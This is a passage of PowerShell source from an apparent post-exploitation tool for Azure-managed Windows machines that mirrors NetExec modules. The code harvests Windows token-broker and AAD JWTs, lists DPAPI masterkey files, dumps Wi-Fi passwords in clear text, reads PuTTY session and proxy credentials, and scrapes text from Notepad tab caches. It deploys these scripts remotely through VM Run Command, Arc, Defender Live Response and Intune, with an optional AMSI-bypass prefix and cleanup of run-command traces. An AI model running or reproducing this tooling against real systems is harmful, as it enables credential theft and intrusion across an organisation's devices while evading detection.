                IISConfigs = @()
                GraphAPIFindings = $graphData.GraphAPIFindings
                Error = $null
            }

            $result.Data = $parsed
            $result.Success = $true
            return [PSCustomObject]$result
        }

        # Disk method - run on target
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-SCCMExtractionScript -SCCMMethod $SCCMMethod

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-sccm-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-SCCMOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# WAM TOKEN BROKER (NetExec -M wam equivalent)
# ============================================

<#
.SYNOPSIS
    Generate PowerShell script for WAM Token Broker extraction.
.DESCRIPTION
    Creates a PowerShell script that extracts Windows Account Manager (WAM)
    tokens, AAD Broker Plugin data, and DPAPI masterkey information from
    all user profiles on the target.
.OUTPUTS
    String containing the PowerShell script.
#>
function Get-WAMExtractionScript {
    return @'
$results = @{
    Tokens = @()
    DPAPIMasterKeys = @()
    Hostname = $env:COMPUTERNAME
}

# Enumerate all user profiles
$profileList = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*" -ErrorAction SilentlyContinue
foreach ($profile in $profileList) {
    $sid = $profile.PSChildName
    $profilePath = $profile.ProfileImagePath
    if (-not $profilePath -or $profilePath -match "\\systemprofile$|\\LocalService$|\\NetworkService$") { continue }
    $username = Split-Path $profilePath -Leaf

    # TokenBroker Cache (.tbres, .tbacct files)
    $tokenBrokerPath = "$profilePath\AppData\Local\Microsoft\TokenBroker\Cache"
    if (Test-Path $tokenBrokerPath) {
        $cacheFiles = Get-ChildItem -Path $tokenBrokerPath -Include "*.tbres","*.tbacct" -Recurse -ErrorAction SilentlyContinue
        foreach ($cf in $cacheFiles) {
            try {
                $content = Get-Content -Path $cf.FullName -Raw -ErrorAction SilentlyContinue
                if ($content) {
                    # Search for JWT patterns
                    $jwtMatches = [regex]::Matches($content, 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
                    foreach ($jwt in $jwtMatches) {
                        $jwtToken = $jwt.Value
                        # Decode JWT payload
                        $parts = $jwtToken -split '\.'
                        if ($parts.Count -ge 2) {
                            $payload = $parts[1]
                            # Fix base64 padding
                            $pad = 4 - ($payload.Length % 4)
                            if ($pad -lt 4) { $payload += "=" * $pad }
                            $payload = $payload.Replace('-', '+').Replace('_', '/')
                            try {
                                $decodedBytes = [Convert]::FromBase64String($payload)
                                $decoded = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
                                $claims = $decoded | ConvertFrom-Json -ErrorAction SilentlyContinue
                                $results.Tokens += @{
                                    Source = $cf.FullName
                                    Username = $username
                                    SID = $sid
                                    UPN = if ($claims.upn) { $claims.upn } elseif ($claims.unique_name) { $claims.unique_name } else { "" }
                                    Audience = if ($claims.aud) { $claims.aud } else { "" }
                                    Scope = if ($claims.scp) { $claims.scp } else { "" }
                                    Expiry = if ($claims.exp) { [DateTimeOffset]::FromUnixTimeSeconds($claims.exp).DateTime.ToString("yyyy-MM-dd HH:mm:ss UTC") } else { "" }
                                    IssuedAt = if ($claims.iat) { [DateTimeOffset]::FromUnixTimeSeconds($claims.iat).DateTime.ToString("yyyy-MM-dd HH:mm:ss UTC") } else { "" }
                                    RawJWT = $jwtToken
                                }
                            } catch {}
                        }
                    }
                }
            } catch {}
        }
    }

    # AAD Broker Plugin tokens
    $aadBrokerBase = "$profilePath\AppData\Local\Packages"
    if (Test-Path $aadBrokerBase) {
        $aadBrokerDirs = Get-ChildItem -Path $aadBrokerBase -Filter "Microsoft.AAD.BrokerPlugin_*" -Directory -ErrorAction SilentlyContinue
        foreach ($aadDir in $aadBrokerDirs) {
            $aadTokenPath = "$($aadDir.FullName)\AC\TokenBroker\Accounts"
            if (Test-Path $aadTokenPath) {
                $aadFiles = Get-ChildItem -Path $aadTokenPath -Recurse -ErrorAction SilentlyContinue
                foreach ($af in $aadFiles) {
                    try {
                        $content = Get-Content -Path $af.FullName -Raw -ErrorAction SilentlyContinue
                        if ($content) {
                            $jwtMatches = [regex]::Matches($content, 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
                            foreach ($jwt in $jwtMatches) {
                                $jwtToken = $jwt.Value
                                $parts = $jwtToken -split '\.'
                                if ($parts.Count -ge 2) {
                                    $payload = $parts[1]
                                    $pad = 4 - ($payload.Length % 4)
                                    if ($pad -lt 4) { $payload += "=" * $pad }
                                    $payload = $payload.Replace('-', '+').Replace('_', '/')
                                    try {
                                        $decodedBytes = [Convert]::FromBase64String($payload)
                                        $decoded = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
                                        $claims = $decoded | ConvertFrom-Json -ErrorAction SilentlyContinue
                                        $results.Tokens += @{
                                            Source = $af.FullName
                                            Username = $username
                                            SID = $sid
                                            UPN = if ($claims.upn) { $claims.upn } elseif ($claims.unique_name) { $claims.unique_name } else { "" }
                                            Audience = if ($claims.aud) { $claims.aud } else { "" }
                                            Scope = if ($claims.scp) { $claims.scp } else { "" }
                                            Expiry = if ($claims.exp) { [DateTimeOffset]::FromUnixTimeSeconds($claims.exp).DateTime.ToString("yyyy-MM-dd HH:mm:ss UTC") } else { "" }
                                            IssuedAt = if ($claims.iat) { [DateTimeOffset]::FromUnixTimeSeconds($claims.iat).DateTime.ToString("yyyy-MM-dd HH:mm:ss UTC") } else { "" }
                                            RawJWT = $jwtToken
                                        }
                                    } catch {}
                                }
                            }
                        }
                    } catch {}
                }
            }
        }
    }

    # IdentityService tokens
    $identityServicePath = "$profilePath\AppData\Local\Microsoft\IdentityCache"
    if (Test-Path $identityServicePath) {
        $idFiles = Get-ChildItem -Path $identityServicePath -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20
        foreach ($idf in $idFiles) {
            try {
                $content = Get-Content -Path $idf.FullName -Raw -ErrorAction SilentlyContinue
                if ($content) {
                    $jwtMatches = [regex]::Matches($content, 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
                    foreach ($jwt in $jwtMatches) {
                        $jwtToken = $jwt.Value
                        $parts = $jwtToken -split '\.'
                        if ($parts.Count -ge 2) {
                            $payload = $parts[1]
                            $pad = 4 - ($payload.Length % 4)
                            if ($pad -lt 4) { $payload += "=" * $pad }
                            $payload = $payload.Replace('-', '+').Replace('_', '/')
                            try {
                                $decodedBytes = [Convert]::FromBase64String($payload)
                                $decoded = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
                                $claims = $decoded | ConvertFrom-Json -ErrorAction SilentlyContinue
                                $results.Tokens += @{
                                    Source = $idf.FullName
                                    Username = $username
                                    SID = $sid
                                    UPN = if ($claims.upn) { $claims.upn } elseif ($claims.unique_name) { $claims.unique_name } else { "" }
                                    Audience = if ($claims.aud) { $claims.aud } else { "" }
                                    Scope = if ($claims.scp) { $claims.scp } else { "" }
                                    Expiry = if ($claims.exp) { [DateTimeOffset]::FromUnixTimeSeconds($claims.exp).DateTime.ToString("yyyy-MM-dd HH:mm:ss UTC") } else { "" }
                                    IssuedAt = if ($claims.iat) { [DateTimeOffset]::FromUnixTimeSeconds($claims.iat).DateTime.ToString("yyyy-MM-dd HH:mm:ss UTC") } else { "" }
                                    RawJWT = $jwtToken
                                }
                            } catch {}
                        }
                    }
                }
            } catch {}
        }
    }

    # DPAPI masterkey files
    $protectPath = "$profilePath\AppData\Roaming\Microsoft\Protect\$sid"
    if (Test-Path $protectPath) {
        $mkFiles = Get-ChildItem -Path $protectPath -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^[0-9a-fA-F-]{36}$' }
        foreach ($mk in $mkFiles) {
            $results.DPAPIMasterKeys += @{
                SID = $sid
                Username = $username
                Path = $mk.FullName
                Name = $mk.Name
                LastModified = $mk.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
            }
        }
    }
}

Write-Output "---WAM---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

<#
.SYNOPSIS
    Parse WAM Token Broker extraction output.
.PARAMETER Output
    Raw output from the WAM extraction script.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Parse-WAMOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        Tokens = @()
        DPAPIMasterKeys = @()
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "WAM extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---WAM---\s*(.+)\s*---SUCCESS---") {
            $wamData = $Matches[1].Trim()
            $parsed = $wamData | ConvertFrom-Json

            $result.Tokens = if ($parsed.Tokens) { $parsed.Tokens } else { @() }
            $result.DPAPIMasterKeys = if ($parsed.DPAPIMasterKeys) { $parsed.DPAPIMasterKeys } else { @() }
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse WAM JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Execute WAM Token Broker extraction on a single target.
.PARAMETER Target
    Target object with VM/Device information.
.PARAMETER PVKFile
    Path to DPAPI PVK file for decryption.
.PARAMETER MasterKeyFile
    Path to DPAPI master key file for decryption.
.PARAMETER AmsiBypass
    Path to AMSI bypass script.
.PARAMETER Timeout
    Execution timeout in seconds.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Invoke-WAMExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$PVKFile,

        [Parameter(Mandatory = $false)]
        [string]$MasterKeyFile,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "WAM"
        Success = $false
        Data = $null
        Error = $null
        PVKFile = $PVKFile
        MasterKeyFile = $MasterKeyFile
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "WAM extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-WAMExtractionScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-wam-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-WAMOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# WIFI PASSWORD EXTRACTION (NetExec -M wifi)
# ============================================

function Get-WiFiExtractionScript {
    return @'
$results = @{
    Profiles = @()
    Error = $null
}
try {
    $profileOutput = netsh wlan show profiles 2>&1
    if ($profileOutput -match "There is no wireless interface") {
        $results.Error = "No wireless interface found"
        Write-Output "---WIFI---"
        Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
        Write-Output "---SUCCESS---"
        return
    }
    $profileNames = @()
    foreach ($line in $profileOutput) {
        if ($line -match "All User Profile\s+:\s+(.+)") {
            $profileNames += $Matches[1].Trim()
        }
    }
    foreach ($name in $profileNames) {
        $detail = netsh wlan show profile name="$name" key=clear 2>&1
        $auth = ""
        $cipher = ""
        $key = ""
        foreach ($line in $detail) {
            if ($line -match "Authentication\s+:\s+(.+)") { $auth = $Matches[1].Trim() }
            if ($line -match "Cipher\s+:\s+(.+)") { $cipher = $Matches[1].Trim() }
            if ($line -match "Key Content\s+:\s+(.+)") { $key = $Matches[1].Trim() }
        }
        $results.Profiles += @{
            SSID = $name
            Authentication = if ($auth) { $auth } else { "Unknown" }
            Cipher = if ($cipher) { $cipher } else { "Unknown" }
            Key = if ($key) { $key } else { "" }
        }
    }
} catch {
    $results.Error = $_.Exception.Message
}
Write-Output "---WIFI---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

function Parse-WiFiOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        Profiles = @()
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "WiFi extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---WIFI---\s*(.+)\s*---SUCCESS---") {
            $data = $Matches[1].Trim()
            $parsed = $data | ConvertFrom-Json
            $result.Profiles = if ($parsed.Profiles) { $parsed.Profiles } else { @() }
            $result.Error = $parsed.Error
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse WiFi JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

function Invoke-WiFiExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "WIFI"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "WiFi extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-WiFiExtractionScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-wifi-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-WiFiOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# PUTTY SESSION EXTRACTION (NetExec -M putty)
# ============================================

function Get-PuTTYExtractionScript {
    return @'
$results = @{
    Sessions = @()
    Error = $null
}
try {
    $sids = Get-ChildItem "Registry::HKEY_USERS" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'S-1-5-21-' -and $_.Name -notmatch '_Classes$' }
    foreach ($sidItem in $sids) {
        $sid = $sidItem.PSChildName
        $username = try { (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value } catch { $sid }
        $puttyPath = "Registry::HKEY_USERS\$sid\Software\SimonTatham\PuTTY\Sessions"
        if (-not (Test-Path $puttyPath)) { continue }
        $sessions = Get-ChildItem $puttyPath -ErrorAction SilentlyContinue
        foreach ($session in $sessions) {
            $props = Get-ItemProperty -Path $session.PSPath -ErrorAction SilentlyContinue
            $results.Sessions += @{
                User = $username
                SessionName = [System.Uri]::UnescapeDataString($session.PSChildName)
                HostName = if ($props.HostName) { $props.HostName } else { "" }
                Port = if ($props.PortNumber) { $props.PortNumber } else { 22 }
                UserName = if ($props.UserName) { $props.UserName } else { "" }
                PublicKeyFile = if ($props.PublicKeyFile) { $props.PublicKeyFile } else { "" }
                ProxyUsername = if ($props.ProxyUsername) { $props.ProxyUsername } else { "" }
                ProxyPassword = if ($props.ProxyPassword) { $props.ProxyPassword } else { "" }
            }
        }
    }
} catch {
    $results.Error = $_.Exception.Message
}
Write-Output "---PUTTY---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

function Parse-PuTTYOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        Sessions = @()
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "PuTTY extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---PUTTY---\s*(.+)\s*---SUCCESS---") {
            $data = $Matches[1].Trim()
            $parsed = $data | ConvertFrom-Json
            $result.Sessions = if ($parsed.Sessions) { $parsed.Sessions } else { @() }
            $result.Error = $parsed.Error
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse PuTTY JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

function Invoke-PuTTYExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "PUTTY"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "PuTTY extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-PuTTYExtractionScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-putty-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-PuTTYOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# NOTEPAD TAB STATE EXTRACTION (NetExec -M notepad)
# ============================================

function Get-NotepadExtractionScript {
    return @'
$results = @{
    Tabs = @()
    Error = $null
}
try {
    $profiles = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') }
    foreach ($profile in $profiles) {
        $tabStatePath = "$($profile.FullName)\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState"
        if (-not (Test-Path $tabStatePath)) { continue }
        $binFiles = Get-ChildItem "$tabStatePath\*.bin" -ErrorAction SilentlyContinue
        foreach ($bin in $binFiles) {
            try {
                $bytes = [System.IO.File]::ReadAllBytes($bin.FullName)
                if ($bytes.Length -lt 4) { continue }
                $text = [System.Text.Encoding]::ASCII.GetString($bytes)
                $asciiMatches = [regex]::Matches($text, '[\x20-\x7E]{4,}')
                $utf16Text = [System.Text.Encoding]::Unicode.GetString($bytes)
                $utf16Matches = [regex]::Matches($utf16Text, '[\x20-\x7E]{4,}')
                $recovered = @()
                foreach ($m in $asciiMatches) { $recovered += $m.Value }
                foreach ($m in $utf16Matches) { $recovered += $m.Value }
                $recovered = $recovered | Where-Object { $_ -notmatch '^[\s]+$' -and $_.Length -gt 3 } | Select-Object -Unique
                if ($recovered.Count -gt 0) {
                    $results.Tabs += @{
                        User = $profile.Name
                        FilePath = $bin.FullName
                        RecoveredText = ($recovered -join "`n")
                        SizeBytes = $bytes.Length
                    }
                }
            } catch {}
        }
    }
} catch {
    $results.Error = $_.Exception.Message
}
Write-Output "---NOTEPAD---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

function Parse-NotepadOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        Tabs = @()
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "Notepad extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---NOTEPAD---\s*(.+)\s*---SUCCESS---") {
            $data = $Matches[1].Trim()
            $parsed = $data | ConvertFrom-Json
            $result.Tabs = if ($parsed.Tabs) { $parsed.Tabs } else { @() }
            $result.Error = $parsed.Error
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse Notepad JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

function Invoke-NotepadExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "NOTEPAD"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "Notepad extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
